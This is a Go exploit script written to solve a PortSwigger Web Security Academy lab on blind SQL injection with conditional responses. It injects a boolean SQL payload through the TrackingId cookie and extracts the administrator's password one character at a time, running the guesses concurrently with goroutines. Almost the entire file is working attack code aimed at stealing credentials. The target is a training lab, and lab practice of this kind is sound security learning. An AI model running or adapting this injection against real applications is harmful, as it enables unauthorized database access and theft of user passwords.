// this expliot used to solve this PortSwigger Lab:
// https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
// you can use goroutine to extremely fast extract the password but it will be random
// so you can frist run it with goroutine to determine the lengh then run it with out
// goroutine to get the right order so this will save a lot of time

package main

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"strconv"
	"strings"
	"sync"
)

var data []int

func brute(tURL string, t int, fast bool) {
	for c := 47; c < 140; c++ {
		req, err := http.NewRequest("get", tURL, nil)
		if err != nil {
			log.Panic(err)
		}

		payload := "select password from users where username='administrator'"
		cVal := "x' or ascii(substring((" + payload + ")," + strconv.Itoa(t) + ",1))='" + strconv.Itoa(c) + "'--+-"

		vulnCookie := http.Cookie{
			Name:  "TrackingId",
			Value: cVal,
		}
		req.AddCookie(&vulnCookie)
		Client := http.Client{}
		resp, err := Client.Do(req)
		if err != nil {
			log.Panic(err)
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if strings.Contains(string(body), "Welcome back!") {
			if fast {
				data = append(data, c)
			}
			fmt.Print(string(rune(c)))
		}

	}

}

func main() {

	// replace this with your temp lab url
	tarURL := "https://0aab006f03a174cd80a985c200740059.web-security-academy.net/"

	// to run goroutine uncomment the wg and go func values!

	var wg sync.WaitGroup
	for t := 0; t < 40; t++ {
		wg.Add(1)
		go func() {
			brute(tarURL, t, true)
			wg.Done()
		}()
	}
	wg.Wait()
	defer fmt.Printf("\nlenght: %d\n", len(data))
}
